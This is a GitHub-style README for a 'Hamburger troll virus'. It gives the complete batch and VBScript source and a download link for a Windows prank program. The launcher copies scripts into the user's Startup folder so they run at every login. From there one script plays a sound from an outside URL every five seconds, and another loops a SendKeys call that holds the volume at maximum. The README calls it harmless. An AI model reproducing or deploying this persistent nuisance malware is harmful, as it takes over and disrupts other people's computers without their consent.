![hamburger](http://leoaqua.de/hamburger.ico)
# Hamburger-troll-virus

# What does it do?

It let's your PC say "HAMBURGER" every 5 seconds with full volume after login or reboot

# FAQ
 Is it dangerous?
 - No 
 
 How can I get rid of it?
 
 - Execute uninstall.exe 
 
 It does not start!
 
 - Just wait or log off
 
 
# Download

[Releases](https://github.com/Leo-Aqua/Hamburger-troll-virus/releases)
 
# How it works

- launcher.bat

```Batchfile
@echo off
move hamburger.vbs %temp%
move volup.vbs %temp%
move tab.bat "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
move launcher.bat %temp%
```
Installs files




- hamburger.vbs

```VBScript
While true
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
wscript.sleep 5000
oPlayer.URL = "https://www.myinstants.com/media/sounds/hamburger-sound-effect.mp3"
oPlayer.controls.play
While oPlayer.playState <> 1 ' 1 = Stopped
WScript.Sleep 100
Wend
oPlayer.close
Wend
```

Plays the _"hamburger"_ sound every 5 seconds

- volup.vbs
```VBScript
do
wscript.sleep 50
Set WshShell = CreateObject("WScript.Shell")
WshShell.SendKeys(chr(&hAF))
loop
```
raises volume to max using _"sendkeys"_ command

- tab.bat
```Batchfile
cd %temp%
start hamburger.vbs
start volup.vbs
exit
```
Starts everything

# Compiler
IExpress LMAO

